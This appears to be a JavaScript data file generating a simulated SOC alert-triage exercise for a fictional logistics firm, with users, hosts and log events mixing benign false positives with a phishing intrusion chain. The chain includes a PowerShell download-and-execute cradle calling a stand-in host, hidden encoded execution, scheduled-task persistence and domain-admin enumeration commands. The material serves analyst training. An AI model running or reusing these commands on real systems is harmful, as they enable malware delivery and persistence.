(function () {
  // UTF-16LE base64 like PowerShell -EncodedCommand
  const b64u16 = s => { let b = ''; for (const c of s) { const n = c.charCodeAt(0); b += String.fromCharCode(n & 255, n >> 8); } return btoa(b); };
  const STAGE1 = "IEX (New-Object Net.WebClient).DownloadString('https://msupdate-cdn-check.example/stage1')";
  const ENC = b64u16(STAGE1);
  const LNK_SHA = '7c1d9e0b4a3f58a2e6b9d4c1f07a83e5b2c6d9140f3a7e8b5c2d6a91e04f3b78';
  const EXE_SHA = '3fa91c27d84e05b6a1c93f7e2d58b04ac6e19d3f7b8052ea4c61d90b7f3e28a5';
  const E = (id, t, source, hostId, event, msg, fields = {}, o = {}) => Object.assign({ id, t, source, hostId, event, msg, fields }, o);

  const users = [
    { id: 'u-hdoyle', name: 'Hannah Doyle', username: 'hdoyle', email: 'hdoyle@halvorsenlogistics.com', dept: 'Finance', title: 'Accounts Payable Specialist', manager: 'Raymond Voss', location: 'Oak Brook HQ' },
    { id: 'u-jsmith', name: 'Jordan Smith', username: 'jsmith', email: 'jsmith@halvorsenlogistics.com', dept: 'Operations', title: 'Dispatch Coordinator', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-rpatel', name: 'Ravi Patel', username: 'rpatel', email: 'rpatel@halvorsenlogistics.com', dept: 'IT', title: 'Systems Administrator', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-sgreene', name: 'Sophie Greene', username: 'sgreene', email: 'sgreene@halvorsenlogistics.com', dept: 'IT', title: 'IT Support Analyst', manager: 'Ravi Patel', location: 'Oak Brook HQ' },
    { id: 'u-mchen', name: 'Mei Chen', username: 'mchen', email: 'mchen@halvorsenlogistics.com', dept: 'Sales', title: 'Senior Account Manager', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-tosei', name: 'Tunde Osei', username: 'tosei', email: 'tosei@halvorsenlogistics.com', dept: 'HR', title: 'HR Generalist', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-dkowal', name: 'Dorota Kowalczyk', username: 'dkowal', email: 'dkowal@halvorsenlogistics.com', dept: 'Operations', title: 'Dispatch Planner', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-bnguyen', name: 'Bao Nguyen', username: 'bnguyen', email: 'bnguyen@halvorsenlogistics.com', dept: 'Marketing', title: 'Marketing Coordinator', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-lcastro', name: 'Luis Castro', username: 'lcastro', email: 'lcastro@halvorsenlogistics.com', dept: 'Warehouse', title: 'Warehouse Supervisor', manager: 'Callum Murphy', location: 'Joliet DC' },
    { id: 'u-aflores', name: 'Alicia Flores', username: 'aflores', email: 'aflores@halvorsenlogistics.com', dept: 'Customer Service', title: 'Customer Service Lead', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-tbrooke', name: 'Tamsin Brooke', username: 'tbrooke', email: 'tbrooke@halvorsenlogistics.com', dept: 'Customer Service', title: 'Customer Service Agent', manager: 'Alicia Flores', location: 'Oak Brook HQ' },
    { id: 'u-ikaur', name: 'Inderjit Kaur', username: 'ikaur', email: 'ikaur@halvorsenlogistics.com', dept: 'Finance', title: 'Payroll Specialist', manager: 'Raymond Voss', location: 'Oak Brook HQ' },
    { id: 'u-rvoss', name: 'Raymond Voss', username: 'rvoss', email: 'rvoss@halvorsenlogistics.com', dept: 'Finance', title: 'Finance Controller', manager: 'Callum Murphy', location: 'Oak Brook HQ' },
    { id: 'u-cmurphy', name: 'Callum Murphy', username: 'cmurphy', email: 'cmurphy@halvorsenlogistics.com', dept: 'Executive', title: 'Chief Operating Officer', manager: '', location: 'Oak Brook HQ' },
    { id: 'u-nabdi', name: 'Nadia Abdi', username: 'nabdi', email: 'nabdi@halvorsenlogistics.com', dept: 'Procurement', title: 'Procurement Manager', manager: 'Callum Murphy', location: 'Oak Brook HQ' }
  ];
  const H = (id, hostname, ip, os, type, userId, dept, criticality, agent = '7.4.1') => ({ id, hostname, ip, os, type, userId, dept, criticality, agent });
  const hosts = [
    H('h-dc01', 'DC01', '10.20.1.10', 'Windows Server 2022', 'dc', null, 'IT', 'crown'),
    H('h-fs01', 'FS01', '10.20.1.21', 'Windows Server 2019', 'server', null, 'IT', 'high'),
    H('h-fs02', 'FS02', '10.20.1.22', 'Windows Server 2022', 'server', null, 'IT', 'high'),
    H('h-sccm01', 'SCCM01', '10.20.1.40', 'Windows Server 2022', 'server', null, 'IT', 'medium'),
    H('h-mailgw', 'MAIL-GW01', '10.20.1.30', 'Windows Server 2019', 'server', null, 'IT', 'medium'),
    H('h-scan01', 'SCAN01', '10.20.9.15', 'Windows Server 2022', 'server', null, 'IT', 'medium'),
    H('h-web01', 'WEB01', '10.20.2.15', 'Windows Server 2022', 'server', null, 'IT', 'high'),
    H('h-vpn01', 'VPN-FW01', '10.20.0.2', 'PAN-OS 11.1', 'network', null, 'IT', 'high'),
    H('h-fin-031', 'FIN-LT-031', '10.20.4.31', 'Windows 11 Pro', 'laptop', 'u-hdoyle', 'Finance', 'high'),
    H('h-fin-018', 'FIN-WS-018', '10.20.4.18', 'Windows 11 Pro', 'workstation', 'u-ikaur', 'Finance', 'high'),
    H('h-ops-007', 'OPS-WS-007', '10.20.5.7', 'Windows 11 Pro', 'workstation', 'u-jsmith', 'Operations', 'low'),
    H('h-ops-012', 'OPS-WS-012', '10.20.5.12', 'Windows 11 Pro', 'workstation', 'u-dkowal', 'Operations', 'low'),
    H('h-it-004', 'IT-LT-004', '10.20.9.44', 'Windows 11 Enterprise', 'laptop', 'u-rpatel', 'IT', 'medium'),
    H('h-it-011', 'IT-WS-011', '10.20.9.51', 'Windows 11 Pro', 'workstation', 'u-sgreene', 'IT', 'medium'),
    H('h-sal-009', 'SAL-LT-009', '10.20.6.9', 'Windows 11 Pro', 'laptop', 'u-mchen', 'Sales', 'low'),
    H('h-hr-003', 'HR-LT-003', '10.20.7.3', 'Windows 11 Pro', 'laptop', 'u-tosei', 'HR', 'medium'),
    H('h-mkt-005', 'MKT-WS-005', '10.20.8.5', 'Windows 11 Pro', 'workstation', 'u-bnguyen', 'Marketing', 'low'),
    H('h-cs-014', 'CS-WS-014', '10.20.10.14', 'Windows 11 Pro', 'workstation', 'u-aflores', 'Customer Service', 'low'),
    H('h-wh-002', 'WH-WS-002', '10.20.11.2', 'Windows 10 Enterprise', 'workstation', 'u-lcastro', 'Warehouse', 'low')
  ];

  /* ---------- storyline & evidence events ---------- */
  const ev = [
    // A-1001 failed logons then reset
    E('e-101', '07:58:12', 'WinEvent', 'h-ops-007', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=jsmith WorkstationName=OPS-WS-007 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'jsmith' }),
    E('e-102', '07:58:31', 'WinEvent', 'h-ops-007', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=jsmith WorkstationName=OPS-WS-007 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'jsmith' }),
    E('e-103', '07:59:02', 'WinEvent', 'h-ops-007', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=jsmith WorkstationName=OPS-WS-007 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'jsmith' }),
    E('e-104', '07:59:40', 'WinEvent', 'h-ops-007', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=jsmith WorkstationName=OPS-WS-007 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'jsmith' }),
    E('e-105', '08:01:18', 'WinEvent', 'h-dc01', '4724 Password reset', 'EventID=4724 An attempt was made to reset an account\'s password. Subject: CORP\\sgreene Target: CORP\\jsmith Ticket=INC0045122', { code: '4724', ticket: 'INC0045122' }, { user: 'sgreene' }),
    E('e-106', '08:02:05', 'WinEvent', 'h-ops-007', '4624 Logon', 'EventID=4624 LogonType=2 TargetUserName=jsmith WorkstationName=OPS-WS-007 Status=Success', { code: '4624', logontype: '2' }, { user: 'jsmith' }),
    // A-1002 vuln scan
    E('e-111', '08:15:02', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.20.9.15:51022 -> 10.20.4.31:445 bytes=2140 app=smb', { action: 'allow', dport: '445' }, { src: '10.20.9.15', dst: '10.20.4.31' }),
    E('e-112', '08:16:40', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.20.9.15:51190 -> 10.20.5.7:135 bytes=1880 app=msrpc', { action: 'allow', dport: '135' }, { src: '10.20.9.15', dst: '10.20.5.7' }),
    E('e-113', '08:19:11', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.20.9.15:51377 -> 10.20.1.21:3389 bytes=960 app=ms-rdp', { action: 'allow', dport: '3389' }, { src: '10.20.9.15', dst: '10.20.1.21' }),
    E('e-114', '08:20:30', 'NDR', 'h-scan01', 'Horizontal scan', 'NDR: horizontal port scan detected src=10.20.9.15 targets=214 hosts ports=22,80,135,139,443,445,3389 duration=5m', { count: '214', scantype: 'horizontal' }, { src: '10.20.9.15' }),
    E('e-115', '08:00:12', 'WinEvent', 'h-scan01', '4624 Logon', 'EventID=4624 LogonType=3 TargetUserName=svc-tenable SourceNetworkAddress=10.20.9.15 Status=Success (credentialed scan service account)', { code: '4624' }, { user: 'svc-tenable', src: '10.20.9.15' }),
    // A-1003 encoded powershell (SCCM)
    E('e-121', '08:34:50', 'EDR', 'h-it-004', 'ProcessCreate', 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ' + b64u16("Get-CimInstance Win32_Product | Select Name,Version | Export-Csv \\\\SCCM01\\hwinv$\\IT-LT-004.csv -NoTypeInformation") + ' parent=CcmExec.exe signed=Microsoft', { process: 'powershell.exe', parent: 'CcmExec.exe', signer: 'Microsoft Windows' }, { user: 'SYSTEM' }),
    E('e-122', '08:34:52', 'WinEvent', 'h-it-004', '4104 ScriptBlock', 'EventID=4104 ScriptBlockText: Get-CimInstance Win32_Product | Select Name,Version | Export-Csv \\\\SCCM01\\hwinv$\\IT-LT-004.csv -NoTypeInformation', { code: '4104', process: 'powershell.exe' }, { user: 'SYSTEM' }),
    E('e-123', '08:35:10', 'WinEvent', 'h-sccm01', '5145 Share access', 'EventID=5145 ShareName=\\\\SCCM01\\hwinv$ RelativeTarget=IT-LT-004.csv Account=CORP\\IT-LT-004$ Access=WriteData', { code: '5145' }, { user: 'IT-LT-004$', src: '10.20.9.44' }),
    E('e-124', '08:30:05', 'WinEvent', 'h-sccm01', 'Baseline deployed', 'CCM: Compliance baseline "Software Inventory 2026-Q4" deployed to collection "IT Endpoints" (CHG-4469)', { ticket: 'CHG-4469' }, { user: 'rpatel' }),
    // A-1004 reported phish (legit LinkedIn)
    E('e-131', '08:44:10', 'Email', 'h-mailgw', 'Delivered', 'Delivered from=notifications-noreply@linkedin.com to=ikaur@halvorsenlogistics.com subject="Inderjit, you appeared in 9 searches this week" spf=pass dkim=pass dmarc=pass sender_ip=198.51.100.40 verdict=clean', { sender: 'notifications-noreply@linkedin.com', recipient: 'ikaur@halvorsenlogistics.com', subject: 'Inderjit, you appeared in 9 searches this week', spf: 'pass', dkim: 'pass', dmarc: 'pass', verdict: 'clean' }, { user: 'ikaur', src: '198.51.100.40' }),
    E('e-132', '08:50:22', 'Email', 'h-mailgw', 'UserReport', 'User-reported message via Report Phish button: reporter=ikaur@halvorsenlogistics.com messageid=<7f31a@linkedin.com> reason="looks suspicious"', { reporter: 'ikaur' }, { user: 'ikaur' }),
    E('e-133', '08:50:40', 'Email', 'h-mailgw', 'URL detonation', 'Sandbox: 3 URLs detonated, all resolve to linkedin.com; final landing page clean; attachments=0 verdict=clean', { verdict: 'clean', domain: 'linkedin.com' }, { user: 'ikaur' }),
    // A-1005 impossible travel
    E('e-141', '08:12:30', 'Auth', null, 'Sign-in success', 'Entra sign-in: user=mchen@halvorsenlogistics.com app=Office365 ip=198.51.100.77 city="Oak Brook, IL" client=Browser device=SAL-LT-009 (compliant) result=0 mfa=satisfied', { app: 'Office365', result: '0', city: 'Oak Brook, IL', device: 'SAL-LT-009' }, { user: 'mchen', src: '198.51.100.77' }),
    E('e-142', '08:58:02', 'Auth', null, 'Sign-in success', 'Entra sign-in: user=mchen@halvorsenlogistics.com app=Outlook-iOS ip=203.0.113.52 city="Denver, CO" client=MobileApp device="iPhone 15 (Intune compliant, registered)" result=0 mfa=satisfied-by-token-claim', { app: 'Outlook-iOS', result: '0', city: 'Denver, CO', device: 'iPhone 15 compliant' }, { user: 'mchen', src: '203.0.113.52' }),
    E('e-143', '08:12:10', 'VPN', 'h-vpn01', 'No VPN session', 'GlobalProtect: mchen not connected via VPN today (on-premise; corp LAN 10.20.6.9)', {}, { user: 'mchen', src: '10.20.6.9' }),
    // A-1006 USB
    E('e-151', '09:24:50', 'EDR', 'h-hr-003', 'DeviceConnect', 'USB mass storage connected: vendor=IronKey model=D300S serial=A1B2C3D4E5 encrypted=yes assettag=HLG-USB-0192 allowlisted=yes', { device: 'IronKey D300S', allowlisted: 'yes', assettag: 'HLG-USB-0192' }, { user: 'tosei' }),
    E('e-152', '09:25:10', 'DLP', 'h-hr-003', 'Device policy', 'DLP: removable media policy "Allow encrypted corporate devices" matched; action=allow; files copied this session=0', { policy: 'Allow encrypted corporate devices', files_copied: '0' }, { user: 'tosei' }),
    E('e-153', '09:25:45', 'EDR', 'h-hr-003', 'DeviceInfo', 'Device inventory: HLG-USB-0192 assigned to HR (payroll archive transfers) by IT asset mgmt on 2026-01-14', { assettag: 'HLG-USB-0192' }, { user: 'tosei' }),
    // TP1 chain
    E('e-201', '09:14:22', 'Email', 'h-mailgw', 'Delivered', 'Delivered from=billing@brightline-pkg-billing.example to=hdoyle@halvorsenlogistics.com subject="Overdue invoice INV-77-2210 - final notice" spf=softfail dkim=none dmarc=fail sender_ip=203.0.113.45 verdict=unscanned_link tag=[EXTERNAL]', { sender: 'billing@brightline-pkg-billing.example', recipient: 'hdoyle@halvorsenlogistics.com', subject: 'Overdue invoice INV-77-2210 - final notice', spf: 'softfail', dkim: 'none', dmarc: 'fail', url: 'https://docs-brightline-billing.example/inv/77-2210' }, { user: 'hdoyle', src: '203.0.113.45' }),
    E('e-202', '09:31:08', 'Proxy', 'h-fin-031', 'HTTP GET', '10.20.4.31 hdoyle "GET https://docs-brightline-billing.example/inv/77-2210 HTTP/1.1" 200 5120 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0" cat="Uncategorized (newly seen)" action=allowed', { domain: 'docs-brightline-billing.example', url: 'https://docs-brightline-billing.example/inv/77-2210', status: '200', category: 'Uncategorized', action: 'allowed' }, { user: 'hdoyle', dst: '203.0.113.45' }),
    E('e-203', '09:31:11', 'Proxy', 'h-fin-031', 'HTTP GET', '10.20.4.31 hdoyle "GET https://docs-brightline-billing.example/dl/INV-77-2210.zip HTTP/1.1" 200 184322 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0" content-type=application/zip cat="Uncategorized (newly seen)" action=allowed', { domain: 'docs-brightline-billing.example', url: 'https://docs-brightline-billing.example/dl/INV-77-2210.zip', status: '200', category: 'Uncategorized', filetype: 'zip' }, { user: 'hdoyle', dst: '203.0.113.45' }),
    E('e-204', '09:33:40', 'EDR', 'h-fin-031', 'FileCreate', 'FileCreate C:\\Users\\hdoyle\\Downloads\\INV-77-2210.zip pid=6012 (chrome.exe) size=184322 mark-of-the-web=yes', { process: 'chrome.exe', path: 'C:\\Users\\hdoyle\\Downloads\\INV-77-2210.zip' }, { user: 'hdoyle' }),
    E('e-205', '09:37:02', 'EDR', 'h-fin-031', 'FileCreate', 'FileCreate C:\\Users\\hdoyle\\Downloads\\INV-77-2210\\Invoice_77-2210.pdf.lnk pid=5120 (explorer.exe) sha256=' + LNK_SHA, { process: 'explorer.exe', path: 'C:\\Users\\hdoyle\\Downloads\\INV-77-2210\\Invoice_77-2210.pdf.lnk', sha256: LNK_SHA }, { user: 'hdoyle' }),
    E('e-206', '09:38:44', 'EDR', 'h-fin-031', 'ProcessCreate', 'cmd.exe /c powershell.exe -w hidden -nop -ep bypass -enc ' + ENC + ' parent=explorer.exe(5120) pid=7340', { process: 'cmd.exe', parent: 'explorer.exe', hidden: 'yes' }, { user: 'hdoyle' }),
    E('e-207', '09:38:46', 'EDR', 'h-fin-031', 'ProcessCreate', 'powershell.exe -w hidden -nop -ep bypass -enc ' + ENC + ' parent=cmd.exe(7340) pid=7388 flag=SUSPICIOUS', { process: 'powershell.exe', parent: 'cmd.exe', encoded: 'yes', hidden: 'yes' }, { user: 'hdoyle' }),
    E('e-208', '09:38:49', 'DNS', 'h-fin-031', 'DNS Query', 'query: msupdate-cdn-check.example IN A from 10.20.4.31 -> 198.51.100.23 NOERROR', { domain: 'msupdate-cdn-check.example', answer: '198.51.100.23', rcode: 'NOERROR' }, { user: 'hdoyle', src: '10.20.4.31', dst: '198.51.100.23' }),
    E('e-209', '09:38:51', 'Proxy', 'h-fin-031', 'HTTP GET', '10.20.4.31 hdoyle "GET https://msupdate-cdn-check.example/stage1 HTTP/1.1" 200 48211 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)" cat="Uncategorized (newly seen)" action=allowed', { domain: 'msupdate-cdn-check.example', url: 'https://msupdate-cdn-check.example/stage1', status: '200', category: 'Uncategorized' }, { user: 'hdoyle', dst: '198.51.100.23' }),
    E('e-210', '09:39:20', 'Firewall', 'h-fin-031', 'Allow', 'ALLOW TCP 10.20.4.31:50877 -> 198.51.100.23:443 bytes=52119 app=ssl', { action: 'allow', dport: '443', domain: 'msupdate-cdn-check.example' }, { src: '10.20.4.31', dst: '198.51.100.23', user: 'hdoyle' }),
    E('e-211', '09:40:12', 'EDR', 'h-fin-031', 'ProcessCreate', 'rundll32.exe (no arguments) parent=powershell.exe(7388) pid=7512 flag=MALICIOUS note="child of hidden powershell, no command line, outbound network" ', { process: 'rundll32.exe', parent: 'powershell.exe' }, { user: 'hdoyle' }),
    // A-1008 migration
    E('e-221', '09:30:00', 'ITSM', 'h-fs02', 'Change started', 'ITSM: CHG-4471 "Migrate departmental shares FS01 -> FS02 (robocopy /MIR)" implementation started by Chidi Eze, approved by CAB 2026-11-05', { ticket: 'CHG-4471' }, { user: 'ceze' }),
    E('e-222', '09:30:06', 'WinEvent', 'h-fs02', '4688 Process', 'EventID=4688 NewProcessName=C:\\Windows\\System32\\Robocopy.exe CommandLine="robocopy \\\\FS01\\Shares D:\\Shares /MIR /COPY:DATSOU /MT:32 /R:1 /W:1 /LOG:D:\\logs\\mig.log" ParentProcess=powershell.exe Subject=CORP\\svc-migrate', { code: '4688', process: 'robocopy.exe' }, { user: 'svc-migrate' }),
    E('e-223', '09:52:10', 'EDR', 'h-fs02', 'MassFileWrite', 'Mass file write: 18442 files/min process=robocopy.exe user=CORP\\svc-migrate path=D:\\Shares\\Finance\\ new-extensions=0 entropy=normal', { process: 'robocopy.exe', count: '18442' }, { user: 'svc-migrate' }),
    E('e-224', '09:57:30', 'EDR', 'h-fs02', 'Ransomware heuristic', 'Heuristic detail: extension distribution unchanged vs source; no ransom note files; no shadow copy deletion; source=\\\\FS01 read-only mirror', { process: 'robocopy.exe', verdict_detail: 'copy pattern' }, { user: 'svc-migrate' }),
    // A-1009 rare domain
    E('e-231', '10:00:41', 'DNS', 'h-ops-012', 'DNS Query', 'query: freightcalc-tools.example IN A from 10.20.5.12 -> 192.0.2.88 NOERROR', { domain: 'freightcalc-tools.example', rcode: 'NOERROR' }, { user: 'dkowal', src: '10.20.5.12', dst: '192.0.2.88' }),
    E('e-232', '10:00:44', 'Proxy', 'h-ops-012', 'HTTP GET', '10.20.5.12 dkowal "GET https://freightcalc-tools.example/ HTTP/1.1" 200 22480 "Mozilla/5.0 Edg/131.0" cat="Uncategorized (newly seen)" action=allowed', { domain: 'freightcalc-tools.example', url: 'https://freightcalc-tools.example/', status: '200', category: 'Uncategorized' }, { user: 'dkowal', dst: '192.0.2.88' }),
    E('e-233', '10:01:12', 'Proxy', 'h-ops-012', 'HTTP GET', '10.20.5.12 dkowal "GET https://freightcalc-tools.example/quote?lane=ORD-DFW&weight=18000 HTTP/1.1" 200 8210 "Mozilla/5.0 Edg/131.0" cat="Uncategorized (newly seen)" action=allowed', { domain: 'freightcalc-tools.example', url: 'https://freightcalc-tools.example/quote?lane=ORD-DFW', status: '200' }, { user: 'dkowal', dst: '192.0.2.88' }),
    E('e-234', '09:55:20', 'Email', 'h-mailgw', 'Delivered', 'Delivered from=jlee@midwestcarriers.example to=dkowal@halvorsenlogistics.com subject="Rate check - use our calculator" spf=pass dkim=pass dmarc=pass verdict=clean', { sender: 'jlee@midwestcarriers.example', recipient: 'dkowal@halvorsenlogistics.com', subject: 'Rate check - use our calculator' }, { user: 'dkowal' }),
    // A-1011 local admin
    E('e-241', '10:25:50', 'ITSM', null, 'Ticket updated', 'ITSM: INC0045140 "Label printer driver install needs local admin (24h)" approved_by=Callum Murphy assigned=sgreene target=WH-WS-002 user=lcastro', { ticket: 'INC0045140' }, { user: 'sgreene' }),
    E('e-242', '10:26:15', 'WinEvent', 'h-wh-002', '4732 Group member added', 'EventID=4732 A member was added to a security-enabled local group. Group: Administrators Member: CORP\\lcastro Subject: CORP\\sgreene', { code: '4732', group: 'Administrators' }, { user: 'sgreene' }),
    E('e-243', '10:26:40', 'WinEvent', 'h-wh-002', '4624 Logon', 'EventID=4624 LogonType=3 TargetUserName=sgreene SourceNetworkAddress=10.20.9.51 Status=Success (remote management session)', { code: '4624', logontype: '3' }, { user: 'sgreene', src: '10.20.9.51' }),
    // A-1012 DNS TXT mail gw
    E('e-271', '10:50:02', 'DNS', 'h-mailgw', 'DNS Query', 'query: _dmarc.supplier-one.example IN TXT from 10.20.1.30 -> NOERROR', { domain: '_dmarc.supplier-one.example', qtype: 'TXT' }, { src: '10.20.1.30' }),
    E('e-272', '10:50:03', 'DNS', 'h-mailgw', 'DNS Query', 'query: supplier-one.example IN TXT from 10.20.1.30 -> NOERROR', { domain: 'supplier-one.example', qtype: 'TXT' }, { src: '10.20.1.30' }),
    E('e-273', '10:51:20', 'DNS', 'h-mailgw', 'DNS Query', 'query: s1._domainkey.carrierco.example IN TXT from 10.20.1.30 -> NOERROR', { domain: 's1._domainkey.carrierco.example', qtype: 'TXT' }, { src: '10.20.1.30' }),
    E('e-274', '10:54:30', 'NDR', 'h-mailgw', 'DNS volume', 'NDR: TXT query volume src=10.20.1.30 count=1420/5m unique_domains=611 max_label_len=28 avg_entropy=2.9 (low) resolves=all valid', { count: '1420', max_label: '28' }, { src: '10.20.1.30' }),
    E('e-275', '10:54:45', 'Email', 'h-mailgw', 'Inbound volume', 'Mail gateway inbound rate 2,180 msgs/5m (Monday AM peak); SPF/DKIM/DMARC checks performed per message', { rate: '2180' }, {}),
    // TP2 beaconing; generated below. A-1013 persistence
    E('e-261', '11:12:05', 'EDR', 'h-fin-031', 'FileCreate', 'FileCreate C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe pid=7512 (rundll32.exe) signed=no sha256=' + EXE_SHA, { process: 'rundll32.exe', path: 'C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe', sha256: EXE_SHA, signed: 'no' }, { user: 'hdoyle' }),
    E('e-262', '11:12:08', 'EDR', 'h-fin-031', 'ProcessCreate', 'schtasks.exe /create /tn "\\Microsoft\\Windows\\Edge\\MicrosoftEdgeUpdateTaskCore" /tr "C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe" /sc onlogon /rl highest /f parent=rundll32.exe(7512)', { process: 'schtasks.exe', parent: 'rundll32.exe' }, { user: 'hdoyle' }),
    E('e-263', '11:12:09', 'WinEvent', 'h-fin-031', '4698 Scheduled task', 'EventID=4698 A scheduled task was created. TaskName=\\Microsoft\\Windows\\Edge\\MicrosoftEdgeUpdateTaskCore Author=CORP\\hdoyle Command=C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe', { code: '4698' }, { user: 'hdoyle' }),
    E('e-264', '11:24:30', 'EDR', 'h-fin-031', 'ProcessCreate', 'cmd.exe /c net group "Domain Admins" /domain parent=rundll32.exe(7512) pid=8210', { process: 'cmd.exe', parent: 'rundll32.exe' }, { user: 'hdoyle' }),
    E('e-265', '11:26:10', 'EDR', 'h-fin-031', 'ProcessCreate', 'nltest.exe /dclist:corp parent=cmd.exe(8210) pid=8244', { process: 'nltest.exe', parent: 'cmd.exe' }, { user: 'hdoyle' }),
    E('e-266', '11:26:55', 'WinEvent', 'h-dc01', '4661 Object access', 'EventID=4661 SAM handle requested ObjectType=SAM_DOMAIN Subject=CORP\\hdoyle Source=10.20.4.31 (enumeration of privileged group)', { code: '4661' }, { user: 'hdoyle', src: '10.20.4.31' }),
    // A-1014 web 404s
    E('e-281', '12:10:04', 'Web', 'h-web01', 'HTTP 404', '198.51.100.99 - - [GET /status HTTP/1.1] 404 312 "PingMonitor/2.1 (+https://pingmonitor.example/bot)"', { status: '404', path: '/status', ua: 'PingMonitor/2.1' }, { src: '198.51.100.99', dst: '10.20.2.15' }),
    E('e-282', '12:11:04', 'Web', 'h-web01', 'HTTP 404', '198.51.100.99 - - [GET /status HTTP/1.1] 404 312 "PingMonitor/2.1 (+https://pingmonitor.example/bot)"', { status: '404', path: '/status', ua: 'PingMonitor/2.1' }, { src: '198.51.100.99', dst: '10.20.2.15' }),
    E('e-283', '12:18:04', 'Web', 'h-web01', 'HTTP 404', '198.51.100.99 - - [GET /status HTTP/1.1] 404 312 "PingMonitor/2.1 (+https://pingmonitor.example/bot)"', { status: '404', path: '/status', ua: 'PingMonitor/2.1' }, { src: '198.51.100.99', dst: '10.20.2.15' }),
    E('e-284', '11:05:30', 'Web', 'h-web01', 'Deploy', 'IIS: application pool recycled; portal release 4.18 deployed (CHG-4472): /status endpoint renamed to /healthz', { ticket: 'CHG-4472' }, {}),
    E('e-285', '12:19:30', 'Web', 'h-web01', 'HTTP summary', 'Summary 12:00-12:20: 404=61 (100% from 198.51.100.99 path=/status), 200=4,812, 5xx=0; no 404s on any other path', { notfound: '61' }, { dst: '10.20.2.15' }),
    // A-1015 forwarding
    E('e-291', '13:02:40', 'Cloud', null, 'New-InboxRule', 'M365 audit: Operation=New-InboxRule User=aflores Name="OOO coverage" ForwardTo=tbrooke@halvorsenlogistics.com ClientIP=10.20.10.14 Result=Succeeded', { operation: 'New-InboxRule', forwardto: 'tbrooke@halvorsenlogistics.com' }, { user: 'aflores', src: '10.20.10.14' }),
    E('e-292', '13:02:45', 'Cloud', null, 'Set-MailboxAutoReplyConfiguration', 'M365 audit: Operation=Set-MailboxAutoReplyConfiguration User=aflores AutoReplyState=Scheduled End=2026-11-13 Message="Out of office: back Friday, urgent requests to Tamsin Brooke" ClientIP=10.20.10.14', { operation: 'Set-MailboxAutoReplyConfiguration' }, { user: 'aflores', src: '10.20.10.14' }),
    E('e-293', '13:02:20', 'Auth', 'h-cs-014', 'Sign-in success', 'Entra sign-in: user=aflores@halvorsenlogistics.com app=OWA ip=198.51.100.77 city="Oak Brook, IL" device=CS-WS-014 (compliant) result=0 mfa=satisfied', { app: 'OWA', result: '0' }, { user: 'aflores', src: '198.51.100.77' }),
    // A-1016 VPN brute force
    E('e-301', '13:31:02', 'VPN', 'h-vpn01', 'Login failed', 'GlobalProtect: login failed user=admin src=203.0.113.150 reason=invalid user/password', { result: 'failed' }, { user: 'admin', src: '203.0.113.150', dst: '10.20.0.2' }),
    E('e-302', '13:33:15', 'VPN', 'h-vpn01', 'Login failed', 'GlobalProtect: login failed user=administrator src=203.0.113.150 reason=invalid user/password', { result: 'failed' }, { user: 'administrator', src: '203.0.113.150', dst: '10.20.0.2' }),
    E('e-303', '13:37:41', 'VPN', 'h-vpn01', 'Login failed', 'GlobalProtect: login failed user=backup src=203.0.113.150 reason=invalid user', { result: 'failed' }, { user: 'backup', src: '203.0.113.150', dst: '10.20.0.2' }),
    E('e-304', '13:39:40', 'VPN', 'h-vpn01', 'Auth summary', 'GlobalProtect summary src=203.0.113.150 window=15m failed=63 success=0 distinct_usernames=19 valid_directory_users=0 lockouts=0', { failed: '63', success: '0', valid_users: '0' }, { src: '203.0.113.150', dst: '10.20.0.2' }),
    // A-1017 big upload
    E('e-311', '14:21:10', 'Proxy', 'h-mkt-005', 'HTTP POST', '10.20.8.5 bnguyen "POST https://content.dropbox.com/upload HTTP/1.1" 200 2254857830 "Dropbox/197.4" cat="Cloud Storage" action=allowed', { domain: 'content.dropbox.com', bytes_out: '2254857830', category: 'Cloud Storage' }, { user: 'bnguyen', dst: '162.125.1.15' }),
    E('e-312', '14:28:12', 'DLP', 'h-mkt-005', 'Upload scanned', 'DLP: upload to dropbox.com file="Q4_Product_Promo_Final.mp4" size=2.1GB classification=Public label=Marketing-Public sensitive_patterns=0 policy_action=allow', { file: 'Q4_Product_Promo_Final.mp4', classification: 'Public' }, { user: 'bnguyen' }),
    E('e-313', '14:28:40', 'EDR', 'h-mkt-005', 'FileRead', 'FileRead \\\\FS01\\Shares\\Marketing\\Public\\Q4_Product_Promo_Final.mp4 by Dropbox.exe (signed Dropbox, Inc.)', { process: 'Dropbox.exe', path: '\\\\FS01\\Shares\\Marketing\\Public\\Q4_Product_Promo_Final.mp4' }, { user: 'bnguyen' }),
    // A-1018 lockout storm
